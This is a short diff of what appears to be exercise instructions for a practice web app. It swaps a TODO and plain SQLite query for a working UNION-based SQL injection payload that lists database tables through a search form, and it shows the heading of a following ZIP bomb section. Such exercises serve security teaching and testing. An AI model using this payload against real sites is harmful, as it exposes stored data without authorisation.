@@ -70,10 +70,9 @@ The sign-in page requires the following inputs:
 
 Attack the search form with an SQL injection, e.g. by querying all tables in the database:
 
-- [ ] TODO: Create a query string that actually works for an SQL injection
 
 ```sql
-SELECT name FROM sqlite_schema WHERE type = 'table' AND name NOT LIKE 'sqlite_%';
+Llamaland' UNION SELECT type, name, name FROM sqlite_schema WHERE type = 'table' AND name NOT LIKE 'sqlite_%
 ```
 
 ## Create a ZIP bomb
